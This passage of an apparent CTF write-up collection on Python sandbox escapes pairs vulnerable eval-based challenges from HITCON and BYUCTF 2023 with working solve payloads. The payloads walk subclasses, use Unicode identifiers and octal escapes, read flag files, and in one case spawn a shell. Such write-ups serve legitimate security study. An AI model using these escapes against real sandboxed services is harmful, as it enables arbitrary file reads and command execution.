                f"{_1234567890}"[_1+_2],f"{_1234567890}"[_4],f"{_1234567890}"[_8],f"{_1234567890}"[_1+_4],f"{_1234567890}"[_2],f"{_1234567890}"[_1+_2+_4],f"{_1234567890}"[_1],f"{_1234567890}"[_2+_4],f"{_1234567890}"[_1+_8],f"{_1234567890}"[_0],
                f"{(lambda:(yield))()}"[_1+_2+_8+_16],f"{(lambda:(yield))()}"[_1+_4+_8],f"{(lambda:(yield))()}"[_2+_16]
            )
        )(_2+_16+_64+_128+(_1<<(_1+_8))+(_1<<(_1+_16))+(_1<<(_2+_16))+(_1<<(_4+_16))+(_1<<(_1+_2+_4+_16))+(_1<<(_8+_16))+(_1<<(_1+_2+_8+_16))+(_1<<(_2+_4+_8+_16)))
        )(_1+_1, _1<<(_1+_1), _1<<(_1+_1+_1), _1<<(_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1+_1), _1<<(_1+_1+_1+_1+_1+_1+_1))
    )(g!=g, g==g)
)

# @ maple3142 - OOB read, ref (https://blog.splitline.tw/hitcon-ctf-2022/#v-o-i-d-misc)
from types import CodeType
import unicodedata

def clear(code):
    return CodeType(
        code.co_argcount, code.co_kwonlyargcount, code.co_nlocals,
        code.co_stacksize, code.co_flags, code.co_code,
        # No consts for youuu
        tuple(clear(c) if isinstance(c, CodeType) else None for c in code.co_consts),
        # No names for youuuu
        (),
        code.co_varnames, code.co_filename, code.co_name,
        code.co_firstlineno, code.co_lnotab, code.co_freevars,
        code.co_cellvars
    )

def getnum(num):
    if num == 0:
        return '(not[[]])'
    return '(' + ('(not[])+' * num)[:-1] + ')'

names = []
chr_code = 0
for x in range(1500):
    while True:
        chr_code += 1
        char = unicodedata.normalize('NFKC', chr(chr_code))
        if char.isidentifier() and char not in names:
            names.append(char)
            break

table = {
    '__iter__': 710,
    '__reversed__': 713,
    '__doc__': 716,
    '__dir__': 1144,
}
def load_name(name):
    return names[table[name]]
builtins = f'fn(fn,fn.{load_name("__dir__")}()[{getnum(15)}])'
code = f'''lambda fn: [{",".join(names)}] if [] else [
    fn({builtins},{builtins}.{load_name("__dir__")}()[{getnum(12)}])()]
'''
print(code)  # copy this to the server
co = clear(compile(code, __name__, "eval"))
print(co.co_consts)
print(id(co.co_consts), id(co.co_names))
val = eval(co, {'__builtins__': {}}, {})(getattr)
print(val)
```

### BYUCTF 2023: Builtins 2

- `b2.py`

```py
inp = input("code> ")[:72]
if "__" in inp:
    print("Nope")
else:
    print(eval(inp, {"__builtins__": {}}, {"__builtins__": {}}))
```

- `solve.py`

```py
()._＿class＿_._＿base＿_._＿subclasses＿_()[118].get_data('.','flag.txt')
```

### BYUCTF 2023: a-z0-9

- `a-z0-9.py`

```py
eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
```

- `solve.py`

```py
__𝘪𝘮𝘱𝘰𝘳𝘵__(𝘤𝘩𝘳(𝘰𝘳𝘥('ʚ')-𝘰𝘳𝘥('ȫ'))+𝘤𝘩𝘳(𝘰𝘳𝘥('ř')-𝘰𝘳𝘥('æ'))).𝘴𝘺𝘴𝘵𝘦𝘮(𝘤𝘩𝘳(𝘰𝘳𝘥('ř')-𝘰𝘳𝘥('æ'))+𝘤𝘩𝘳(𝘰𝘳𝘥('ȉ')-𝘰𝘳𝘥('ơ')))
```

### BYUCTF 2023: Leet 2

- `leet2.py`

```py
import re
FLAG = open('flag.txt').read()
inp = input('> ')
if re.search(r'[123456789]', inp) or re.search(r'\(', inp) or eval(inp) != 1337:
    print('Nope')
else:
    print(FLAG)
```

- `solve.py`

```py
[_:=[]>[],~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_+~_][[]==[]]*~_
```

### BYUCTF 2023: abcdefghijklm

- `abcdefghijklm.py`

```py
inp = input("code > ").lower()
eval((inp[:4]+__import__("re").sub(r'[a-m]','',inp[4:]))[:80])
```

- `solve.py`

```py
eval("op\\145n(*op\\145n('/\\146\\154\\141\\147.txt'))")
```

### BYUCTF 2023: nopqrstuvwxyz

- `nopqrstuvwxyz.py`

```py
inp = input("code > ").lower()
eval((inp[:4]+__import__("re").sub(r'[n-z]','',inp[4:]))[:80])
```

- `solve.py`

```py
eval("\\157\\160e\\156(*\\157\\160e\\156('/flag.\\164\\170\\164'))")
```

## References

- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
- https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md
- https://jbnrz.com.cn/index.php/2024/05/19/pyjail/
